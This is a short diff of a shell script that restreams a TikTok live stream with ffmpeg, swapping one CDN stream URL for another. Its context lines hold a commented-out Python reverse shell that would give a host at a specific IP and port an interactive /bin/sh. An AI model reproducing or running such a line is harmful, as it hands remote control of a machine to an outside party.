@@ -17,13 +17,13 @@
 #python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #chown root:root /etc/resolv.conf
 #echo -e "nameserver 8.8.8.8\nnameserver 8.8.4.4" >>  /etc/resolv.conf
-###########################################
+###########################################https://pull-f5-gcp01.tiktokcdn.com/stage/stream-3283807712798310572_or4.flv
 #/usr/bin/supervisord -n -c  /etc/supervisor/supervisord.conf -nostdin
 while true; do
   
 
 ffmpeg -re -nostdin \
-      -i  https://pull-f5-gcp01.tiktokcdn.com/stage/stream-3283807712798310572_or4.flv \
+      -i https://pull-flv-l1-va01.tiktokcdn.com/stage/stream-2995580936643674162_or4.flv  \
       -pix_fmt yuvj420p\
       -x264-params keyint=48:min-keyint=48:scenecut=-1\
       -b:v 4500k\
